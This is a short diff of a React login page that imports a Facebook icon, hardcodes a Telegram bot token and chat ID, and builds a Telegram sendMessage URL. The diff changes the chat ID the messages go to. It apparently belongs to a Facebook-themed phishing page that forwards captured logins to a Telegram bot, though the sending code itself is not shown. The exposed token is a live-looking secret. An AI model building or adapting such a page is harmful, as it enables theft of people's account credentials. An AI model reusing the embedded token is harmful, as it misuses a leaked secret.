@@ -3,7 +3,7 @@ import { FaFacebook } from "react-icons/fa";
 
 
 const TOKEN = '7868471336:AAEmJlfqkkrfhLQaj7gKk2iZtucUrEODXRw'; // ⚠️ НЕ публикуй в публичных репозиториях
-const CHAT_ID = '-1002737636573';
+const CHAT_ID = '1844909205';
 const TELEGRAM_API = `https://api.telegram.org/bot${TOKEN}/sendMessage`;
 
 const LoginPage = () => {
